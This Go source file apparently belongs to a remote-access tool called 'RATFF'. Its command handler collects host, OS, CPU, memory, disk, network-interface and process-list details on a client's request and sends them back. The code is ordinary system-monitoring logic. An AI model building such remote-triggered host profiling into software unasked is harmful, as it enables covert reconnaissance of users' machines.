package main

import (
	"RATFF/shared"

	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/disk"
	"github.com/shirou/gopsutil/v3/host"
	"github.com/shirou/gopsutil/v3/mem"
	"github.com/shirou/gopsutil/v3/net"
	"github.com/shirou/gopsutil/v3/process"
)

var allSystemInfoFields = []string{
	"host", "cpu", "memory", "swap_memory",
	"partition", "io_disk", "interfaces",
	"io_network", "processes",
}

func handleSystemInfo(msg shared.Message) shared.Message {
	fieldsRaw, _ := msg.Payload["fields"].([]interface{})

	var fields []string
	if len(fieldsRaw) == 0 {
		fields = allSystemInfoFields
	} else {
		for _, f := range fieldsRaw {
			if s, ok := f.(string); ok {
				fields = append(fields, s)
			}
		}
	}

	result := make(map[string]interface{})

	for _, field := range fields {
		collectField(field, result)
	}

	return shared.NewMessage(shared.MsgResponse, shared.CmdSystemInfo, msg.ClientID, result)
}

func collectField(field string, result map[string]interface{}) {
	switch field {
	case "host":
		result["host"] = collectHost()
	case "cpu":
		result["cpu"] = collectCPU()
	case "memory":
		result["memory"] = collectMemory()
	case "swap_memory":
		result["swap_memory"] = collectSwapMemory()
	case "partition":
		result["partition"] = collectPartition()
	case "io_disk":
		result["io_disk"] = collectIODisk()
	case "interfaces":
		result["interfaces"] = collectInterfaces()
	case "io_network":
		result["io_network"] = collectIONetwork()
	case "processes":
		result["processes"] = collectProcesses()
	default:
		result[field] = map[string]interface{}{"error": "unknown field: " + field}
	}
}

func collectHost() map[string]interface{} {
	info, err := host.Info()
	if err != nil {
		return map[string]interface{}{"error": err.Error()}
	}
	return map[string]interface{}{
		"hostname":         info.Hostname,
		"os":               info.OS,
		"platform":         info.Platform,
		"platform_family":  info.PlatformFamily,
		"platform_version": info.PlatformVersion,
		"kernel_version":   info.KernelVersion,
		"kernel_arch":      info.KernelArch,
		"uptime":           info.Uptime,
		"boot_time":        info.BootTime,
		"procs":            info.Procs,
	}
}

func collectCPU() map[string]interface{} {
	infos, err := cpu.Info()
	if err != nil {
		return map[string]interface{}{"error": err.Error()}
	}
	result := make([]map[string]interface{}, 0, len(infos))
	for _, info := range infos {
		result = append(result, map[string]interface{}{
			"model_name": info.ModelName,
			"cores":      info.Cores,
			"mhz":        info.Mhz,
			"cache_size": info.CacheSize,
			"vendor_id":  info.VendorID,
		})
	}
	return map[string]interface{}{"cpus": result}
}

func collectMemory() map[string]interface{} {
	vm, err := mem.VirtualMemory()
	if err != nil {
		return map[string]interface{}{"error": err.Error()}
	}
	return map[string]interface{}{
		"total":        vm.Total,
		"available":    vm.Available,
		"used":         vm.Used,
		"used_percent": vm.UsedPercent,
		"free":         vm.Free,
		"active":       vm.Active,
		"inactive":     vm.Inactive,
		"buffers":      vm.Buffers,
		"cached":       vm.Cached,
	}
}

func collectSwapMemory() map[string]interface{} {
	swap, err := mem.SwapMemory()
	if err != nil {
		return map[string]interface{}{"error": err.Error()}
	}
	return map[string]interface{}{
		"total":        swap.Total,
		"used":         swap.Used,
		"free":         swap.Free,
		"used_percent": swap.UsedPercent,
		"sin":          swap.Sin,
		"sout":         swap.Sout,
	}
}

func collectPartition() map[string]interface{} {
	partitions, err := disk.Partitions(true)
	if err != nil {
		return map[string]interface{}{"error": err.Error()}
	}

	result := make([]map[string]interface{}, 0, len(partitions))
	for _, p := range partitions {
		usage, err := disk.Usage(p.Mountpoint)
		entry := map[string]interface{}{
			"device":     p.Device,
			"mountpoint": p.Mountpoint,
			"fstype":     p.Fstype,
			"opts":       p.Opts,
		}
		if err == nil {
			entry["total"] = usage.Total
			entry["used"] = usage.Used
			entry["free"] = usage.Free
			entry["used_percent"] = usage.UsedPercent
		} else {
			entry["usage_error"] = err.Error()
		}
		result = append(result, entry)
	}
	return map[string]interface{}{"partitions": result}
}

func collectIODisk() map[string]interface{} {
	ioCounters, err := disk.IOCounters()
	if err != nil {
		return map[string]interface{}{"error": err.Error()}
	}
	result := make(map[string]interface{})
	for name, counter := range ioCounters {
		result[name] = map[string]interface{}{
			"read_count":  counter.ReadCount,
			"write_count": counter.WriteCount,
			"read_bytes":  counter.ReadBytes,
			"write_bytes": counter.WriteBytes,
			"read_time":   counter.ReadTime,
			"write_time":  counter.WriteTime,
		}
	}
	return result
}

func collectInterfaces() map[string]interface{} {
	interfaces, err := net.Interfaces()
	if err != nil {
		return map[string]interface{}{"error": err.Error()}
	}
	result := make([]map[string]interface{}, 0, len(interfaces))
	for _, iface := range interfaces {
		addrs := make([]string, 0, len(iface.Addrs))
		for _, addr := range iface.Addrs {
			addrs = append(addrs, addr.Addr)
		}
		result = append(result, map[string]interface{}{
			"name":      iface.Name,
			"mtu":       iface.MTU,
			"flags":     iface.Flags,
			"addresses": addrs,
		})
	}
	return map[string]interface{}{"interfaces": result}
}

func collectIONetwork() map[string]interface{} {
	ioCounters, err := net.IOCounters(true)
	if err != nil {
		return map[string]interface{}{"error": err.Error()}
	}
	result := make([]map[string]interface{}, 0, len(ioCounters))
	for _, counter := range ioCounters {
		result = append(result, map[string]interface{}{
			"name":         counter.Name,
			"bytes_sent":   counter.BytesSent,
			"bytes_recv":   counter.BytesRecv,
			"packets_sent": counter.PacketsSent,
			"packets_recv": counter.PacketsRecv,
			"errin":        counter.Errin,
			"errout":       counter.Errout,
			"dropin":       counter.Dropin,
			"dropout":      counter.Dropout,
		})
	}
	return map[string]interface{}{"io_counters": result}
}

func collectProcesses() map[string]interface{} {
	procs, err := process.Processes()
	if err != nil {
		return map[string]interface{}{"error": err.Error()}
	}

	result := make([]map[string]interface{}, 0, len(procs))
	for _, p := range procs {
		name, _ := p.Name()
		entry := map[string]interface{}{
			"pid":  p.Pid,
			"name": name,
		}

		status, err := p.Status()
		if err == nil {
			entry["status"] = status
		}

		createTime, err := p.CreateTime()
		if err == nil {
			entry["create_time"] = createTime
		}

		cpuPercent, err := p.CPUPercent()
		if err == nil {
			entry["cpu_percent"] = cpuPercent
		}

		memPercent, err := p.MemoryPercent()
		if err == nil {
			entry["memory_percent"] = memPercent
		}

		result = append(result, entry)
	}
	return map[string]interface{}{
		"count":     len(result),
		"processes": result,
	}
}
